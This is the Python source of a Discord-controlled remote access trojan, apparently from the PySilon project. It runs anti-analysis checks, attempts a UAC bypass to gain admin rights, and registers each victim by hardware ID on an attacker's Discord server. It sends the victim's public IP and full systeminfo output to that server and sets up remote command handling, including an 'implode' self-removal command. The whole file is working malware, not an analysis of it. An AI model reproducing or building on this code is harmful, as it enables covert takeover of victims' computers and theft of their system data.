import discord
import subprocess
from discord.ext import commands
from resources.modules.misc import *
from resources.modules.protections import *
from resources.modules.uac_bypass import *
from urllib.request import urlopen

if protection_check():
    os._exit(0)

if single_instance_lock():
    os._exit(0)

if not IsAdmin():
    if GetSelf()[1]:
        if UACbypass():
            os._exit(0)

client = commands.Bot(command_prefix=['.'], intents=discord.Intents.all(), case_insensitive=True)

# temp area for needed variables, mategol you should add something to do this automatically in the builder ig :p
turned_off = False
clipper_stop = False
# end of area

bot_token = ""
guild_ids = []
channel_ids = {                                                    
    'info': '',                                                  
    'main': '',                                                                                                  
    'file': '',                                                                                                    
}

@client.event
async def on_ready():
    global category, guild_id
    first_run = True
    guild_id_index = 0
    guild_id = guild_ids[guild_id_index]

    hwid = subprocess.check_output('wmic csproduct get uuid', shell=True).decode().split('\n')[1].strip()
    break_loop = False
    for _ in guild_ids:
        print(guild_ids[guild_id_index])
        for category_name in client.get_guild(guild_id).categories:
            if hwid in str(category_name):
                first_run, category = False, category_name
                category_not_found = False
                break_loop = True
                break
            else: category_not_found = True
        if category_not_found:
            get_guild = client.get_guild(guild_id)
            channel_count = len(get_guild.channels)
            if channel_count > 495:
                guild_id_index = guild_id_index + 1
                guild_id = guild_ids[guild_id_index]
            else: break
        if break_loop:
            break
    
    if not first_run:
        category_channel_names = []
        for channel in category.channels:
            category_channel_names.append(channel.name)

        if 'file-related' not in category_channel_names and channel_ids['file']: 
            temp = await client.get_guild(guild_id).create_text_channel('file', category=category)
            channel_ids['file'] = temp.id

    if first_run:
        category = await client.get_guild(guild_id).create_category(hwid)
        temp = await client.get_guild(guild_id).create_text_channel('info', category=category); channel_ids['info'] = temp.id
        temp = await client.get_guild(guild_id).create_text_channel('main', category=category); channel_ids['main'] = temp.id
        temp = await client.get_guild(guild_id).create_text_channel('file-related', category=category); channel_ids['file'] = temp.id

        try: 
            await client.get_channel(channel_ids['info']).send('```IP address: ' + urlopen('https://ident.me').read().decode('utf-8') + ' [ident.me]```')
        except: pass
        try:
            await client.get_channel(channel_ids['info']).send('```IP address: ' + urlopen('https://ipv4.lafibre.info/ip.php').read().decode('utf-8') + ' [lafibre.info]```')
        except: pass
        
        system_info = force_decode(subprocess.run('systeminfo', capture_output= True, shell= True).stdout).strip().replace('\\xff', ' ')
        
        chunk = ''
        for line in system_info.split('\n'):
            if len(chunk) + len(line) > 1990:
                await client.get_channel(channel_ids['info']).send('```' + chunk + '```')
                chunk = line + '\n'
            else:
                chunk += line + '\n'
        await client.get_channel(channel_ids['info']).send('```' + chunk + '```')

    else:
        for channel in category.channels:
            if channel.name == 'info':
                channel_ids['info'] = channel.id
            elif channel.name == 'main':
                channel_ids['main'] = channel.id
            elif channel.name == 'file-related':
                channel_ids['file'] = channel.id

@client.event
async def on_message(ctx):
    print(ctx.content)
    if ctx.channel.id in channel_ids.values() or ctx.content == ".ping":
        await client.process_commands(ctx)

@client.command(name="ping")
async def get_active_clients(ctx):
    await ctx.message.delete()
    await client.get_channel(channel_ids['main']).send(ctx.author.mention)

@client.command(name="implode")
async def delete_category(ctx,  argument=None, password=None):
    if argument == "full":
        if password == "1234":
            for channel in category.channels:
                await channel.delete()
            await category.delete()
            # implosion code
        else: await ctx.send("```Invalid password! Cannot implode.```")
        
    elif argument == "normal":
        if password == "1234":
            await ctx.send('`Normal implosion`')
            # implosion code
        else: await ctx.send("```Invalid password! Cannot implode.```")
    else: 
        await ctx.send("```Improper arguments. \n\nUsage: .implode <normal / full> <password>```")

# [pysilon] commands